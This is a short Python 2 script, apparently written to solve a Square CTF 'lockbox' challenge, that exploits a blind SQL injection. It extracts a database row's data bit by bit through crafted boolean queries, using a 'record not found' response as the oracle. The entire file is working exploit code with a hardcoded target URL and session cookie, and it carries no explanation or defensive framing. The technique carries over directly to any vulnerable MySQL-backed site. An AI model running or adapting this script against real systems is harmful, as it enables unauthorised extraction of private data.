"""
Lame python2 script to exploit the blind SQLi and dump the data from the selected row
"""
import urllib3, requests
import sys

urllib3.disable_warnings()
verbose = False
# Burp proxy for inspecting traffic:
# proxy_dict = {"http":"http://127.0.0.1:8080/",'https':'http://127.0.0.1:8080'}
proxy_dict = {}
bits = (
    '0x01',
    '0x02',
    '0x04',
    '0x08',
    '0x10',
    '0x20',
    '0x40',
    '0x80'
)

def fetch_data(row_id):
    secret = ''
    counter = 0
    i = 0
    while True:
        i += 1 # mysql substring is 1 indexed
        bitstream = ''
        for b in bits:
            query = 'id={id} and (select count(id) where id={id} and ord(substr(data,{char_pos},1))&{bit}={bit})=1'.format(id=row_id, char_pos=i, bit=b)
            if verbose:
                print query
            counter += 1
            resp = requests.get("https://lockbox-6ebc413cec10999c.squarectf.com/", 
                      params={'id': query}, 
                      headers={'Cookie': '__cfduid=db5f86550c39cd4f398cdc524577716421570990817'},
                      proxies=proxy_dict,
                      verify=False)
            if 'record not found' in resp.text:
                bitstream += '0'
            else:
                if verbose:
                    print resp.text
                bitstream += '1'
        if verbose:
            print bitstream[::-1]
        if verbose and bitstream == 8*'0':
            print 'Got null, bailing out!'
            break # break the while loop
        secret += chr(int(bitstream[::-1],2))
        if verbose and counter % 5 == 0:
            print 'Done %d requests' % counter
            print secret
    return secret


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print 'Usage: {script} <row_id>'.format(script=sys.argv[0])
        sys.exit(1)
    secret = fetch_data(sys.argv[1])
    if len(secret) == 0:
        print 'Got no data :('
        sys.exit(1)
    print 'Got data:'
    print secret

